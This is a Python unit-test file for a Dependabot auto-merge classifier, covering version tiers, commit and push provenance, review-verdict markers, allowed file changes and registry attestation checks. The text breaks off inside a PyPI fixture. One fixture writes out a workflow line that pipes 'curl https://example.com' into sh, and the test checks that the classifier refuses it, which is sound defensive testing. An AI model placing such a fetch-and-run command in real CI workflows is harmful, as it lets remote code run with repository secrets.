"""The Dependabot class: the tier both lanes share, the commit check, and the
review activity's merge verdict.

The tier rules are the owner's decision recorded in ADR 0073: major means the
first numeric version component changes or, below 1.0, the second does; an
Actions update is `auto` only from the `actions`, `github` or `anthropics`
publisher; a red `ci-status` and anything unreadable are `review`. Commit
shapes are those of the REST pull-request commits API; the metadata block is
the one Dependabot writes into its commit message; the github-actions[bot]
commit is the repository's `[dependabot skip]` version bump, as
`scripts/lib/changelog-fragments.sh` (`dependabot_only`) accepts it; the round
marker is the one pr-run-activity.md's "prepare: dependency-review" defines.
"""

from __future__ import annotations

import base64
import json
import pathlib
import sys
import unittest
from typing import Any

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

import babysit_dependabot as dependabot

SHA = "d" * 40
ACTIONS_SHA = "e" * 40
HEAD = "f" * 40
OLD_HEAD = "a" * 40
IDENTITY = "agent-lanes[bot]"
NPM = "dependabot/npm_and_yarn/x-1.3.0"
ACTIONS = "dependabot/github_actions/actions/checkout-4.2.0"


def metadata(*updates: tuple[str, str | None, str]) -> str:
    lines = ["Bumps things.", "", "---", "updated-dependencies:"]
    for name, kind, version in updates:
        lines += [f"- dependency-name: {name}", f"  dependency-version: {version}"]
        lines += ["  dependency-type: direct:production"]
        if kind is not None:
            lines.append(f"  update-type: version-update:{kind}")
    lines += ["...", "", "Signed-off-by: dependabot[bot] <support@github.com>"]
    return "\n".join(lines)


def commit(
    message: str,
    *,
    sha: str = SHA,
    name: str = "dependabot[bot]",
    email: str = "49699333+dependabot[bot]@users.noreply.github.com",
    committer: str = "noreply@github.com",
    verified: bool = True,
    login: str | None = None,
) -> dict[str, Any]:
    return {
        "sha": sha,
        "author": {"login": login} if login else None,
        "commit": {
            "message": message,
            "author": {"name": name, "email": email},
            "committer": {"name": "GitHub", "email": committer},
            "verification": {"verified": verified},
        },
    }


def no_files(sha: str) -> list[str] | None:
    raise AssertionError(f"files read for a Dependabot commit {sha}")


def tier(
    title: str, *, body: str = "", ref: str = NPM, ci: str = "success", commits=()
) -> dependabot.Classification:
    return dependabot.classify(title, body, ref, ci, list(commits))


class Classify(unittest.TestCase):
    def test_a_patch_or_1x_minor_update_is_auto(self) -> None:
        for title in (
            "bump x from 1.2.3 to 1.2.4",
            "build(deps): bump x from 1.2.0 to 1.3.0",
        ):
            with self.subTest(title=title):
                result = tier(title)
                self.assertEqual((result.tier, result.reasons), ("auto", ()))

    def test_a_0x_minor_update_is_review(self) -> None:
        # Semver promises nothing below 1.0, so 0.3 to 0.4 is breaking.
        result = tier("Bump x from 0.3.1 to 0.4.0")
        self.assertEqual((result.tier, result.reasons), ("review", ("major:x",)))
        self.assertEqual(tier("Bump x from 0.3.1 to 0.3.2").tier, "auto")

    def test_a_major_update_is_review(self) -> None:
        result = tier("build(deps): bump x from 4.2.0 to 5.0.0")
        self.assertEqual(result.reasons, ("major:x",))

    def test_an_unreadable_title_or_version_is_review(self) -> None:
        self.assertEqual(tier("chore: tidy").reasons, ("unparsed-updates",))
        result = tier("bump x from 0a1b2c3d4e5f to 9f8e7d6c5b4a")
        self.assertEqual(result.reasons, ("unparsed-version:x",))

    def test_a_group_with_one_major_entry_is_review(self) -> None:
        body = (
            "Updates `actions/checkout` from 4.1.0 to 4.2.0\n"
            "Updates `actions/setup-node` from 6.0.0 to 7.0.0\n"
            "Updates `github/codeql-action` from 3.1.0 to 3.1.1\n"
        )
        result = tier(
            "build: Bump the vendor-actions group across 1 directory with 3 updates",
            body=body,
            ref=ACTIONS,
        )
        self.assertEqual(result.reasons, ("major:actions/setup-node",))

    def test_a_group_whose_lines_do_not_add_up_is_review(self) -> None:
        result = tier(
            "bump the g group with 3 updates", body="Updates `a` from 1.0.0 to 1.0.1\n"
        )
        self.assertEqual(result.reasons, ("unparsed-updates",))

    def test_an_actions_update_from_an_unlisted_publisher_is_review(self) -> None:
        self.assertEqual(
            tier("bump actions/checkout from 4.1.0 to 4.2.0", ref=ACTIONS).tier, "auto"
        )
        result = tier("bump someone/action from 1.0.0 to 1.1.0", ref=ACTIONS)
        self.assertEqual(result.reasons, ("publisher:someone/action",))
        # Outside github_actions the publisher is not read.
        self.assertEqual(tier("bump someone/pkg from 1.0.0 to 1.1.0").tier, "auto")

    def test_a_red_ci_status_is_review_and_a_running_one_is_not(self) -> None:
        for ci in sorted(dependabot.RED):
            with self.subTest(ci=ci):
                self.assertIn(
                    "ci-status-red", tier("bump x from 1.0.0 to 1.0.1", ci=ci).reasons
                )
        self.assertEqual(tier("bump x from 1.0.0 to 1.0.1", ci="pending").tier, "auto")

    def test_metadata_is_read_and_must_agree_with_the_title(self) -> None:
        minor = commit(metadata(("x", "semver-minor", "1.3.0")))
        self.assertEqual(
            tier("bump x from 1.2.0 to 1.3.0", commits=[minor]).tier, "auto"
        )
        # Metadata alone, when the title names nothing.
        self.assertEqual(tier("bump x", commits=[minor]).tier, "auto")
        major = commit(metadata(("x", "semver-major", "2.0.0")))
        self.assertEqual(tier("bump x", commits=[major]).reasons, ("major:x",))
        # Metadata calling a 1.x jump minor disagrees with a title reading major.
        result = tier("bump x from 1.9.0 to 2.0.0", commits=[minor])
        self.assertEqual(result.tier, "review")
        self.assertIn("sources-disagree", result.reasons)
        other = commit(metadata(("y", "semver-patch", "1.0.1")))
        self.assertIn(
            "sources-disagree",
            tier("bump x from 1.0.0 to 1.0.1", commits=[other]).reasons,
        )

    def test_a_0x_minor_in_the_metadata_is_major(self) -> None:
        zero = commit(metadata(("x", "semver-minor", "0.4.0")))
        self.assertEqual(tier("bump x", commits=[zero]).reasons, ("major:x",))
        unknown = commit(metadata(("x", None, "1.3.0")))
        self.assertEqual(
            tier("bump x", commits=[unknown]).reasons, ("unparsed-version:x",)
        )

    def test_real_group_metadata_and_body_agree(self) -> None:
        message = metadata(
            ("actions/create-github-app-token", "semver-minor", "3.3.0"),
            ("actions/setup-node", "semver-minor", "7.1.0"),
            ("anthropics/claude-code-action", "semver-patch", "1.0.248"),
        )
        body = (
            "Updates `actions/create-github-app-token` from 3.2.0 to 3.3.0\n"
            "Updates `actions/setup-node` from 7.0.0 to 7.1.0\n"
            "Updates `anthropics/claude-code-action` from 1.0.247 to 1.0.248\n"
        )
        result = tier(
            "build: Bump the vendor-actions group across 1 directory with 3 updates",
            body=body,
            ref=ACTIONS,
            commits=[commit(message)],
        )
        self.assertEqual((result.tier, len(result.updates)), ("auto", 3))


class Commits(unittest.TestCase):
    MESSAGE = metadata(("x", "semver-minor", "1.3.0"))

    def test_a_commit_not_dependabots_is_refused(self) -> None:
        cases = {
            "commit-unverified": commit(self.MESSAGE, verified=False),
            # A pusher can write any author and committer, not the signature.
            "commit-not-committed-by-github": commit(
                self.MESSAGE, committer="me@example.com"
            ),
            "commit-not-dependabot": commit(
                "fix: tweak", name="octocat", email="o@example.com"
            ),
        }
        for reason, other in cases.items():
            with self.subTest(reason=reason):
                refusal = dependabot.commits_refusal(
                    [commit(self.MESSAGE), other], no_files
                )
                self.assertEqual(refusal, f"{reason}:{SHA[:12]}")
        self.assertIsNone(dependabot.commits_refusal([commit(self.MESSAGE)], no_files))
        self.assertEqual(dependabot.commits_refusal([], no_files), "commits-missing")

    def test_the_version_bump_commit_is_accepted(self) -> None:
        bump = commit(
            "chore(plugins): release bump for Dependabot update [dependabot skip]",
            sha=ACTIONS_SHA,
            name="github-actions[bot]",
            email="41898282+github-actions[bot]@users.noreply.github.com",
        )
        paths = ["plugins/miro/.claude-plugin/plugin.json", "plugins/miro/CHANGELOG.md"]
        self.assertIsNone(dependabot.commit_refusal(bump, lambda sha: paths))
        for files, message in (
            (["plugins/miro/server.js"], bump["commit"]["message"]),
            (None, bump["commit"]["message"]),
            (paths, "chore(plugins): release bump"),
        ):
            with self.subTest(files=files, message=message):
                other = {**bump, "commit": {**bump["commit"], "message": message}}
                self.assertIsNotNone(
                    dependabot.commit_refusal(other, lambda sha, f=files: f)
                )

    def test_a_lanes_app_fix_commit_counts_only_for_a_reviewed_pr(self) -> None:
        fix = commit(
            "fix: adapt to the new API [dependabot skip]",
            name="agent-lanes[bot]",
            email="1+agent-lanes[bot]@users.noreply.github.com",
            login=IDENTITY,
        )
        self.assertEqual(
            dependabot.commit_refusal(fix, no_files),
            f"commit-not-dependabot:{SHA[:12]}",
        )
        self.assertIsNone(dependabot.commit_refusal(fix, no_files, IDENTITY))
        unmarked = {**fix, "commit": {**fix["commit"], "message": "fix: adapt"}}
        self.assertIsNotNone(dependabot.commit_refusal(unmarked, no_files, IDENTITY))


def marker(
    head: str = HEAD,
    verdict: str = "merge",
    *,
    login: str = IDENTITY,
    kind: str = "Bot",
    at: str = "2026-10-16T12:00:00Z",
) -> dict[str, Any]:
    return {
        "id": 1,
        "created_at": at,
        "user": {"login": login, "type": kind},
        "body": (
            f"<!-- pr-unblock:review-dependency-round head={head} "
            f"verdict={verdict} run=123-1 -->\nThe review found the bump safe."
        ),
    }


def review_only_policy(*entries: dict[str, str]) -> dict[str, Any]:
    return {
        "autoMerge": {
            "reviewOnly": [
                {
                    "repository": "melodic-software/claude-code-plugins",
                    "ecosystem": "npm",
                    "directory": "/",
                    "dependency": "@anthropic-ai/claude-code",
                    "reviewed": "2026-10-17",
                    "basis": "runs with a secret",
                    "control": "docs/x.md#control",
                    **entry,
                }
                for entry in entries
            ]
        }
    }


class ReviewOnly(unittest.TestCase):
    """`autoMerge.reviewOnly` in the standards Dependabot policy: a listed
    dependency is review whatever its version change; an unreadable policy
    sends every update to review."""

    REPO = "melodic-software/claude-code-plugins"
    ROOT = "dependabot/npm_and_yarn/npm-minor-patch-ba695db9ca"
    UPDATES = (
        dependabot.Update("@anthropic-ai/claude-code", False),
        dependabot.Update("@biomejs/biome", False),
    )

    def reasons(
        self,
        policy: Any,
        head_ref: str = ROOT,
        paths: list[str] | None = None,
    ) -> tuple[str, ...]:
        return dependabot.review_only(
            policy,
            self.REPO,
            head_ref,
            self.UPDATES,
            ["package.json", "package-lock.json"] if paths is None else paths,
        )

    def test_a_listed_dependency_is_review_only(self) -> None:
        self.assertEqual(
            self.reasons(
                review_only_policy(
                    {}, {"repository": "Melodic-Software/Claude-Code-Plugins"}
                )
            ),
            ("review-only:@anthropic-ai/claude-code",),
        )

    def test_each_branch_ecosystem_maps_to_its_dependabot_yml_spelling(self) -> None:
        for segment, ecosystem in (
            ("npm_and_yarn", "npm"),
            ("pip", "pip"),
            ("github_actions", "github-actions"),
        ):
            with self.subTest(segment=segment):
                policy = review_only_policy({"ecosystem": ecosystem})
                self.assertEqual(
                    self.reasons(policy, f"dependabot/{segment}/x-1.0.1"),
                    ("review-only:@anthropic-ai/claude-code",),
                )

    def test_another_repo_ecosystem_directory_or_dependency_does_not_match(
        self,
    ) -> None:
        for fields in (
            {"repository": "melodic-software/standards"},
            {"ecosystem": "pip"},
            {"directory": "/plugins/miro/server"},
            {"dependency": "@playwright/cli"},
        ):
            with self.subTest(fields=fields):
                self.assertEqual(self.reasons(review_only_policy(fields)), ())

    def test_the_directory_is_the_changed_paths_folder(self) -> None:
        policy = review_only_policy({"directory": "/plugins/miro/server"})
        miro = [
            "plugins/miro/server/package.json",
            "plugins/miro/server/package-lock.json",
        ]
        self.assertEqual(
            self.reasons(policy, paths=miro), ("review-only:@anthropic-ai/claude-code",)
        )
        self.assertEqual(self.reasons(review_only_policy({}), paths=miro), ())

    def test_unread_paths_match_any_directory(self) -> None:
        policy = review_only_policy({"directory": "/plugins/miro/server"})
        self.assertEqual(
            dependabot.review_only(policy, self.REPO, self.ROOT, self.UPDATES, None),
            ("review-only:@anthropic-ai/claude-code",),
        )

    def test_an_unreadable_policy_is_review(self) -> None:
        for policy in (
            None,
            [],
            {},
            {"autoMerge": {}},
            {"autoMerge": {"reviewOnly": {}}},
            {"autoMerge": {"reviewOnly": [{"dependency": "x"}]}},
        ):
            with self.subTest(policy=policy):
                self.assertEqual(
                    self.reasons(policy), ("dependabot-policy-unreadable",)
                )

    def test_an_empty_list_lists_nothing(self) -> None:
        self.assertEqual(self.reasons({"autoMerge": {"reviewOnly": []}}), ())


class MergeVerdict(unittest.TestCase):
    def verdict(self, *comments: dict[str, Any]) -> tuple[str | None, str | None]:
        return dependabot.merge_verdict(list(comments), IDENTITY, HEAD)

    def test_a_merge_marker_at_the_current_head_approves(self) -> None:
        self.assertEqual(self.verdict(marker()), ("123-1", None))

    def test_a_marker_at_an_old_head_does_not(self) -> None:
        self.assertEqual(
            self.verdict(marker(OLD_HEAD)), (None, "review-verdict-head-moved")
        )

    def test_a_marker_by_anyone_but_the_lanes_app_is_ignored(self) -> None:
        for login, kind in (
            ("maintainer", "User"),
            ("other-app[bot]", "Bot"),
            (IDENTITY, "User"),
        ):
            with self.subTest(login=login, kind=kind):
                self.assertEqual(
                    self.verdict(marker(login=login, kind=kind)),
                    (None, "review-verdict-missing"),
                )

    def test_a_verdict_other_than_merge_does_not(self) -> None:
        for verdict in ("fix", "close", "escalate"):
            with self.subTest(verdict=verdict):
                self.assertEqual(
                    self.verdict(marker(verdict=verdict)),
                    (None, f"review-verdict:{verdict}"),
                )

    def test_the_newest_lanes_app_marker_decides(self) -> None:
        older = marker(at="2026-10-16T10:00:00Z")
        newer = marker(verdict="escalate", at="2026-10-16T11:00:00Z")
        self.assertEqual(self.verdict(older, newer), (None, "review-verdict:escalate"))
        # A later marker from someone else does not displace the App's.
        forged = marker(login="maintainer", kind="User", at="2026-10-16T13:00:00Z")
        self.assertEqual(self.verdict(older, forged), ("123-1", None))


class IsDependabot(unittest.TestCase):
    def test_every_login_form_the_code_sees(self) -> None:
        for login in (
            "app/dependabot",
            "dependabot[bot]",
            "dependabot",
            "Dependabot[bot]",
        ):
            self.assertTrue(dependabot.is_dependabot(login), login)
        for login in ("dependabot-preview[bot]", "renovate[bot]", "", None):
            self.assertFalse(dependabot.is_dependabot(login), login)


CONFIG = """\
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    groups:
      vendor-actions:
        patterns:
          - actions/*
  - package-ecosystem: npm
    directory: "/plugins/miro/server"
  - package-ecosystem: pip
    directories:
      - /plugins/speech
      - "/.github" # the CI toolchain
"""
CONFIG_PAIRS = dependabot.parse_config(CONFIG)
PIN = (
    "@@ -10,7 +10,7 @@ jobs:\n"
    "       - name: Check out\n"
    "-        uses: actions/checkout@" + "1" * 40 + " # v4.1.0\n"
    "+        uses: actions/checkout@" + "2" * 40 + " # v4.2.0\n"
    "         with:\n"
)


def changed(
    path: str, patch: str | None = None, previous: str | None = None
) -> dict[str, Any]:
    entry: dict[str, Any] = {"filename": path, "status": "modified"}
    if patch is not None:
        entry["patch"] = patch
    if previous:
        entry["previous_filename"] = previous
    return entry


class Content(unittest.TestCase):
    """A Dependabot pull request may change only what `.github/dependabot.yml`
    lets Dependabot change: covered manifests and lock files, and workflow or
    action files whose diff only repins `uses:` lines."""

    def refusal(
        self, *files: dict[str, Any], extra: tuple[str, ...] = ()
    ) -> str | None:
        return dependabot.content_refusal(list(files), CONFIG_PAIRS, extra)

    def test_the_config_reads_every_ecosystem_and_directory(self) -> None:
        self.assertEqual(
            CONFIG_PAIRS,
            [
                ("github-actions", "/"),
                ("npm", "/plugins/miro/server"),
                ("pip", "/plugins/speech"),
                ("pip", "/.github"),
            ],
        )
        self.assertIsNone(dependabot.parse_config("version: 2\n"))

    def test_a_directories_glob_keeps_star_and_question_in_one_segment(self) -> None:
        # The pr-unblock lane's dependency-classify.test.mjs cases, one for
        # one: both lanes must sort a pull request the same way.
        cases = [
            ("plugins/x/scripts/package.json", "/plugins/*/scripts", True),
            ("plugins/x/extra/scripts/package.json", "/plugins/*/scripts", False),
            ("lib-a/package.json", "/lib-*", True),
            ("lib-a/b/package.json", "/lib-*", False),
            ("lib-ab/package.json", "/lib-?b", True),
            ("lib-a/b/package.json", "/lib-?/b", True),
            ("lib-/b/package.json", "/lib-?/b", False),
            ("package.json", "**/*", True),
            ("a/b/c/package.json", "**/*", True),
            ("plugins/x/y/scripts/package.json", "/plugins/**/scripts", True),
            ("plugins/scripts/package.json", "/plugins/**/scripts", True),
            ("plugins.x/package.json", "/plugins?x", True),
            ("pluginsQx/package.json", "/plugins.x", False),
        ]
        for path, directory, covered in cases:
            with self.subTest(path=path, directory=directory):
                refusal = dependabot.content_refusal(
                    [changed(path)], [("npm", directory)]
                )
                self.assertEqual(refusal is None, covered)

    def test_covered_manifests_and_lock_files_pass(self) -> None:
        self.assertIsNone(
            self.refusal(
                changed("plugins/miro/server/package-lock.json"),
                changed("plugins/miro/server/package.json", "@@ -1 +1 @@\n-a\n+b\n"),
                changed("plugins/speech/requirements.txt"),
                changed(".github/requirements-ci.txt"),
            )
        )

    def test_a_manifest_outside_a_covered_directory_is_refused(self) -> None:
        for path in (
            "package.json",
            "plugins/other/requirements.txt",
            "plugins/miro/server/src/package.json",
        ):
            with self.subTest(path=path):
                self.assertEqual(
                    self.refusal(changed(path)), f"dependabot-content:{path}"
                )

    def test_a_non_manifest_file_is_refused(self) -> None:
        self.assertEqual(
            self.refusal(
                changed("plugins/miro/server/package.json"), changed("scripts/x.sh")
            ),
            "dependabot-content:scripts/x.sh",
        )
        # A rename is judged on both sides.
        self.assertEqual(
            self.refusal(
                changed(
                    "plugins/speech/requirements.txt", previous="plugins/speech/run.py"
                )
            ),
            "dependabot-content:plugins/speech/run.py",
        )

    def test_a_uses_pin_only_workflow_diff_passes(self) -> None:
        for path in (".github/workflows/ci.yml", ".github/actions/setup/action.yaml"):
            with self.subTest(path=path):
                self.assertIsNone(self.refusal(changed(path, PIN)))

    def test_a_workflow_diff_changing_a_run_line_is_refused(self) -> None:
        patch = (
            PIN + "-        run: echo hi\n+        run: curl https://example.com | sh\n"
        )
        self.assertEqual(
            self.refusal(changed(".github/workflows/ci.yml", patch)),
            "dependabot-content:.github/workflows/ci.yml",
        )
        # A workflow with no patch (too large to show) cannot be judged.
        self.assertIsNotNone(self.refusal(changed(".github/workflows/ci.yml")))
        # Any other file under .github is not an action file.
        self.assertIsNotNone(self.refusal(changed(".github/scripts/x.yml", PIN)))

    def test_paths_another_checked_commit_touched_pass(self) -> None:
        self.assertIsNone(
            self.refusal(
                changed("plugins/miro/CHANGELOG.md"),
                extra=("plugins/miro/CHANGELOG.md",),
            )
        )


def push(kind: str, after: str, login: str = "dependabot[bot]") -> dict[str, Any]:
    return {
        "activity_type": kind,
        "after": after,
        "actor": {"login": login, "type": "Bot"},
    }


class Pushes(unittest.TestCase):
    """Who pushed each update of the head branch, back to Dependabot's newest
    rewrite of it: a commit's author is text anyone can write; the pusher is
    not."""

    BUMP = commit(
        "chore(plugins): release bump [dependabot skip]",
        sha=ACTIONS_SHA,
        name="github-actions[bot]",
        email="41898282+github-actions[bot]@users.noreply.github.com",
    )

    def test_dependabots_own_pushes_pass(self) -> None:
        history = [push("force_push", HEAD), push("branch_creation", OLD_HEAD)]
        self.assertIsNone(
            dependabot.push_refusal(history, HEAD, [commit("x", sha=HEAD)])
        )

    def test_a_push_by_anyone_else_is_refused(self) -> None:
        history = [push("push", HEAD, "maintainer"), push("branch_creation", OLD_HEAD)]
        self.assertEqual(
            dependabot.push_refusal(history, HEAD, [commit("x", sha=HEAD)]),
            "pushed-by:maintainer",
        )

    def test_github_actions_may_push_only_its_own_bump_commit(self) -> None:
        history = [
            push("push", ACTIONS_SHA, "github-actions[bot]"),
            push("branch_creation", SHA),
        ]
        self.assertIsNone(
            dependabot.push_refusal(history, ACTIONS_SHA, [commit("x"), self.BUMP])
        )
        # A forged Dependabot-authored commit pushed by a workflow token.
        forged = [
            push("push", HEAD, "github-actions[bot]"),
            push("branch_creation", SHA),
        ]
        self.assertEqual(
            dependabot.push_refusal(forged, HEAD, [commit("x"), commit("y", sha=HEAD)]),
            "pushed-by:github-actions[bot]",
        )

    def test_the_lanes_app_may_push_its_fix_only_after_a_review(self) -> None:
        fix = commit(
            "fix [dependabot skip]", sha=HEAD, name="lanes", email="l@x", login=IDENTITY
        )
        history = [push("push", HEAD, IDENTITY), push("force_push", SHA)]
        self.assertEqual(
            dependabot.push_refusal(history, HEAD, [commit("x"), fix]),
            f"pushed-by:{IDENTITY}",
        )
        self.assertIsNone(
            dependabot.push_refusal(history, HEAD, [commit("x"), fix], IDENTITY)
        )

    def test_a_history_that_misses_the_head_or_dependabots_rewrite_is_refused(
        self,
    ) -> None:
        self.assertEqual(
            dependabot.push_refusal([push("force_push", OLD_HEAD)], HEAD, []),
            "push-history-incomplete",
        )
        self.assertEqual(
            dependabot.push_refusal([push("push", HEAD)], HEAD, []),
            "push-history-incomplete",
        )


# The provenance gate, vector for vector with dependency-classify.test.mjs.
# Fixtures carry the shapes the registries return: npm's packument
# (dist.attestations, _npmUser.trustedPublisher) and attestations endpoint (a
# base64 DSSE payload holding the SLSA v1 predicate), PyPI's simple index JSON
# (files[].provenance, upload-time) and integrity endpoint
# (attestation_bundles[].publisher). The identities are what the registries
# served on 2026-10-17: biome 2.5.14 from biomejs/biome
# .github/workflows/release.yml, its trusted publisher's oidcConfigId both
# with and without `oidc:`, numpy from numpy/numpy-release wheels.yml.
REG = "https://registry.npmjs.org"
BIOME = "@biomejs/biome"
BIOME_OIDC = "88a86367-18c3-4668-9f8d-aa7619d345aa"
RELEASE = ".github/workflows/release.yml"


def slsa(repository: str, path: str, ref: str = "refs/heads/main") -> dict[str, Any]:
    predicate = {
        "predicate": {
            "buildDefinition": {
                "externalParameters": {
                    "workflow": {
                        "ref": ref,
                        "repository": f"https://github.com/{repository}",
                        "path": path,
                    }
                }
            }
        }
    }
    payload = base64.b64encode(json.dumps(predicate).encode()).decode()
    return {
        "attestations": [
            {
                "predicateType": "https://github.com/npm/attestation/tree/main/specs/publish/v0.1",
                "bundle": {},
            },
            {
                "predicateType": "https://slsa.dev/provenance/v1",
                "bundle": {"dsseEnvelope": {"payload": payload}},
            },
        ]
    }


def packument(name: str, rows: list[tuple[str, str, dict[str, Any]]]) -> dict[str, Any]:
    versions = {}
    for version, _, flags in rows:
        dist = (
            {"attestations": {"url": f"{REG}/-/npm/v1/attestations/{name}@{version}"}}
            if flags.get("attested")
            else {}
        )
        oidc = flags.get("oidc")
        user = (
            {
                "name": "GitHub Actions",
                "trustedPublisher": {"id": "github", "oidcConfigId": oidc},
            }
            if oidc
            else {"name": "someone"}
        )
        versions[version] = {"version": version, "dist": dist, "_npmUser": user}
    time = {"created": "2020-01-01T00:00:00.000Z", **{v: at for v, at, _ in rows}}
    return {"name": name, "versions": versions, "time": time}


class Registry:
    """Answers only the URLs it holds; anything else raises, as a 404 or a
    timeout does."""

    def __init__(self, pages: dict[str, Any]) -> None:
        self.pages = pages
        self.calls: list[str] = []

    def __call__(self, url: str, accept: str) -> Any:
        self.calls.append(url)
        assert accept, "every read names its media type"
        found = self.pages.get(url)
        if found is None or isinstance(found, Exception):
            raise found or OSError(f"HTTP 404 {url}")
        return json.loads(json.dumps(found))


ATTESTED = {"attested": True, "oidc": f"oidc:{BIOME_OIDC}"}


def biome_pages(
    new_attestation: dict[str, Any] | None = None,
    new_row: dict[str, Any] | None = None,
    *,
    dropped: bool = False,
) -> dict[str, Any]:
    attestation = new_attestation or slsa("biomejs/biome", RELEASE)
    pages: dict[str, Any] = {
        f"{REG}/@biomejs%2Fbiome": packument(
            BIOME,
            [
                ("2.5.12", "2026-09-01T00:00:00Z", ATTESTED),
                ("2.5.13", "2026-09-20T00:00:00Z", ATTESTED),
                ("2.6.0-beta.1", "2026-10-01T00:00:00Z", {}),
                (
                    "2.5.14",
                    "2026-10-10T00:00:00Z",
                    ATTESTED if new_row is None else new_row,
                ),
            ],
        ),
        f"{REG}/-/npm/v1/attestations/@biomejs%2Fbiome@2.5.13": slsa(
            "biomejs/biome", RELEASE
        ),
    }
    if not dropped:
        pages[f"{REG}/-/npm/v1/attestations/@biomejs%2Fbiome@2.5.14"] = attestation
    return pages


def npm(name: str, version: str | None) -> list[dependabot.Update]:
    return [dependabot.Update(name, False, version)]


def reasons(
    updates: list[dependabot.Update], segment: str, get: Any, cap: int = 20
) -> list[str]:
    return list(dependabot.provenance_reasons(updates, segment, get, cap))


class Provenance(unittest.TestCase):
    """README, "Registry provenance": the new version's publisher identity
    against the newest earlier stable version that has one."""

    def test_an_npm_release_from_the_same_repository_and_workflow_passes(self) -> None:
        get = Registry(biome_pages())
        self.assertEqual(reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", get), [])
        # The packument and two attestations; the prerelease is not read.
        self.assertEqual(len(get.calls), 3)

    def test_a_release_workflow_on_a_new_tag_ref_is_the_same_identity(self) -> None:
        tag = slsa("biomejs/biome", RELEASE, "refs/tags/v2.5.14")
        self.assertEqual(
            reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", Registry(biome_pages(tag))),
            [],
        )

    def test_a_dropped_attestation_or_another_publisher_is_review(self) -> None:
        dropped = Registry(biome_pages(new_row={}, dropped=True))
        self.assertEqual(
            reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", dropped),
            [f"provenance-missing:{BIOME}"],
        )
        publisher_only = Registry(
            biome_pages(new_row={"oidc": BIOME_OIDC}, dropped=True)
        )
        self.assertEqual(
            reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", publisher_only),
            [f"provenance-changed:{BIOME}"],
        )
        for repository, path in (
            ("someone/biome", RELEASE),
            ("biomejs/biome", ".github/workflows/other.yml"),
        ):
            with self.subTest(repository=repository, path=path):
                moved = Registry(biome_pages(slsa(repository, path)))
                self.assertEqual(
                    reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", moved),
                    [f"provenance-changed:{BIOME}"],
                )

    def test_an_oidc_config_id_compares_with_any_oidc_prefix_stripped(self) -> None:
        name = "@anthropic-ai/claude-code"

        def pages(oidc: str | None) -> Registry:
            return Registry(
                {
                    f"{REG}/@anthropic-ai%2Fclaude-code": packument(
                        name,
                        [
                            (
                                "2.1.301",
                                "2026-10-01T00:00:00Z",
                                {"oidc": f"oidc:{BIOME_OIDC}"},
                            ),
                            ("2.1.302", "2026-10-02T00:00:00Z", {"oidc": oidc}),
                        ],
                    )
                }
            )

        self.assertEqual(
            reasons(npm(name, "2.1.302"), "npm_and_yarn", pages(BIOME_OIDC)), []
        )
        other = pages("ed8551cb-3303-4af8-bcf8-5818707a0f2d")
        self.assertEqual(
            reasons(npm(name, "2.1.302"), "npm_and_yarn", other),
            [f"provenance-changed:{name}"],
        )
        self.assertEqual(
            reasons(npm(name, "2.1.302"), "npm_and_yarn", pages(None)),
            [f"provenance-missing:{name}"],
        )

    def test_a_package_that_never_had_provenance_passes_in_one_read(self) -> None:
        get = Registry(
            {
                f"{REG}/markdownlint-cli2": packument(
                    "markdownlint-cli2",
                    [
                        ("0.18.0", "2026-08-01T00:00:00Z", {}),
                        ("0.18.1", "2026-09-01T00:00:00Z", {}),
                    ],
                )
            }
        )
        self.assertEqual(
            reasons(npm("markdownlint-cli2", "0.18.1"), "npm_and_yarn", get), []
        )
        self.assertEqual(len(get.calls), 1)

    def test_a_failed_read_a_missing_version_or_no_version_is_unreadable(self) -> None:
        unreadable = [f"provenance-unreadable:{BIOME}"]
        self.assertEqual(
            reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", Registry({})), unreadable
        )
        timeout = biome_pages()
        timeout[f"{REG}/-/npm/v1/attestations/@biomejs%2Fbiome@2.5.13"] = TimeoutError()
        self.assertEqual(
            reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", Registry(timeout)), unreadable
        )
        garbled = biome_pages(
            {
                "attestations": [
                    {
                        "predicateType": "https://slsa.dev/provenance/v1",
                        "bundle": {"dsseEnvelope": {"payload": "not json"}},
                    }
                ]
            }
        )
        self.assertEqual(
            reasons(npm(BIOME, "2.5.14"), "npm_and_yarn", Registry(garbled)), unreadable
        )
        self.assertEqual(
            reasons(npm(BIOME, "9.9.9"), "npm_and_yarn", Registry(biome_pages())),
            unreadable,
        )
        self.assertEqual(
            reasons(npm(BIOME, None), "npm_and_yarn", Registry(biome_pages())),
            unreadable,
        )

    def test_past_the_read_cap_every_remaining_update_is_unreadable(self) -> None:
        two = npm(BIOME, "2.5.14") * 2
        self.assertEqual(
            reasons(two, "npm_and_yarn", Registry(biome_pages()), 4),
            [f"provenance-unreadable:{BIOME}"],
        )
        self.assertEqual(reasons(two, "npm_and_yarn", Registry(biome_pages()), 6), [])

    @staticmethod
    def pypi(
        new_publisher: dict[str, str] | None = None, *, missing: bool = False
    ) -> Registry:
        def integrity(name: str) -> str:
            return f"https://pypi.org/integrity/numpy/{name.split('-')[1]}/{name}/provenance"

        files = [
            (
                "numpy-2.3.4-cp312-cp312-manylinux_2_28_x86_64.whl",
                "2025-10-15T16:15:56Z",
                True,
            ),
            ("numpy-2.3.4.tar.gz", "2025-10-15T16:10:00Z", True),
            (
                "numpy-2.4.0rc1-cp312-cp312-manylinux_2_28_x86_64.whl",
                "2025-11-01T00:00:00Z",
                False,
            ),
            (
                "numpy-2.3.5-cp312-cp312-manylinux_2_28_x86_64.whl",
                "2025-11-16T22:50:02Z",
                not missing,
            ),
            ("numpy-2.3.5.tar.gz", "2025-11-16T22:40:00Z", not missing),
        ]
        publisher = {
            "environment": "pypi",
            "kind": "GitHub",
            "repository": "numpy/numpy-release",
            "workflow": "wheels.yml",
        }
        new = new_publisher or publisher
        pages: dict[str, Any] = {
            "https://pypi.org/simple/numpy/": {
                "meta": {"api-version": "1.4"},
                "name": "numpy",
                "versions": ["2.3.4", "2.3.5", "2.4.0rc1"],
                "files": [
                    {
                        "filename": name,
                        "upload-time": at,
                        "yanked": False,
                        **({"provenance": integrity(name)} if attested else {}),
                    }
                    for name, at, attested in files
                ],
            }
        }
        for name, _, attested in files:
            if attested:
                chosen = new if "2.3.5" in name else publisher
